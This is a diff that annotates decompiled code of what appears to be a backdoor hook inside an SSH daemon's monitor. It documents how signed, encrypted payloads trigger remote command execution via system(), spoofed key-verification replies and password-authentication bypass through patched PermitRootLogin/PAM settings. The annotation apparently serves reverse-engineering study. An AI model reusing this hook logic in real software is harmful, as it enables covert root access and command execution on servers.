@@ -81,11 +81,13 @@ int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)
     clear_cursor = (sshd_payload_ctx_t **)((long)clear_cursor + (ulong)zero_seed * -8 + 4);
   }
   payload_chunk_size = 0;
+  // AutoDoc: Pull the next sshbuf payload chunk straight out of the monitor message so the streaming decrypt can resume where it left off.
   state_ok = sshbuf_extract(m,ctx,(void **)&payload_ctx,(size_t *)&orig_handler);
   if ((state_ok == FALSE) ||
      (state_ok = extract_payload_message
                          ((sshbuf *)&payload_ctx,(size_t)orig_handler,&payload_chunk_size,ctx),
      state_ok == FALSE)) goto LAB_0010944f;
+  // AutoDoc: Decrypt the framed chunk, append it into `ctx->payload_buffer`, and advance `payload_state` if enough bytes have arrived.
   decrypt_payload_message((key_payload_t *)payload_ctx,payload_chunk_size,ctx);
   payload_state = ctx->payload_state;
   if (payload_state == 3) {
@@ -95,6 +97,7 @@ LAB_00109216:
       payload_len = (ulong)payload_record->payload_total_size;
       payload_type = payload_record->command_type;
       payload_data_offset = payload_len - 0x120;
+      // AutoDoc: Type 2 payloads carry a complete `mm_answer_keyverify` reply—copy its length/buffer into `sshd_ctx` and write it back immediately.
       if (payload_type == '\x02') {
         if ((((ctx->sshd_ctx->mm_answer_keyverify_slot != (sshd_monitor_func_t *)0x0) &&
              (4 < payload_data_offset)) &&
@@ -123,6 +126,7 @@ LAB_00109216:
           }
         }
       }
+      // AutoDoc: Type 3 payloads request privilege escalation: honor the supplied uid/gid pair and exec the decrypted body via libc’s `system()`.
       else if (payload_type == '\x03') {
         if (((libc_imports_ref->system != (pfn_system_t)0x0) && (8 < payload_data_offset)) &&
            (payload_record->signed_header_prefix[payload_len - 0x75] == '\0')) {
@@ -137,6 +141,7 @@ LAB_00109216:
           }
         }
       }
+      // AutoDoc: Type 1 payloads stash an authpassword body for later—record the length/pointer so the authpassword hook can emit it on demand.
       else if (((payload_type == '\x01') &&
                (ctx->sshd_ctx->mm_answer_authpassword_slot != (sshd_monitor_func_t *)0x0)) &&
               (1 < payload_data_offset)) {
@@ -155,6 +160,7 @@ LAB_00109216:
         }
         sshd_ctx->pending_authpayload = payload_record;
         ctx->payload_state = 4;
+        // AutoDoc: As soon as an authpassword payload is queued, refresh PermitRootLogin/PAM/request IDs so the follow-on hook won’t trip sshd’s guards.
         state_ok = sshd_patch_variables(TRUE,FALSE,FALSE,0,ctx);
 LAB_001092e5:
         if (state_ok != FALSE) goto LAB_0010944f;
@@ -217,10 +223,12 @@ LAB_001092e5:
           payload_header_buf[copy_idx] = payload_record->signed_header_prefix[copy_idx];
           copy_idx = copy_idx + 1;
         } while (copy_idx != 0x3a);
+        // AutoDoc: State 0: decrypt the signed header seed into `payload_seed_buf` before copying the 0x3a-byte header into `ctx->payload_ctx`.
         state_ok = secret_data_get_decrypted(payload_seed_buf,ctx);
         if ((state_ok != FALSE) &&
            (state_ok = verify_signature(ctx->sshd_sensitive_data->host_pubkeys
                                       [ctx->sshd_host_pubkey_idx],payload_header_buf,0x3a,0x5a,
+                                      // AutoDoc: Verify the Ed448 signature over the fixed header before allowing the state machine to advance beyond stage zero.
                                       ctx->payload_ctx->ed448_signature,payload_seed_buf,ctx),
            state_ok != FALSE)) {
           ctx->payload_state = 1;
@@ -285,6 +293,7 @@ LAB_00109471:
         state_ok = verify_signature(ctx->sshd_sensitive_data->host_pubkeys[ctx->sshd_host_pubkey_idx],
                                   ctx->payload_buffer,payload_data_offset + ctx->sock_read_len,
                                   ctx->payload_buffer_size,payload_header_buf,
+                                  // AutoDoc: State 1 completion: once the final body chunk is spliced in, re-run the signature check across the assembled buffer before switching to command execution.
                                   ctx->payload_ctx->signed_header_prefix,ctx);
         if (state_ok == FALSE) {
           ctx->payload_state = 0xffffffff;
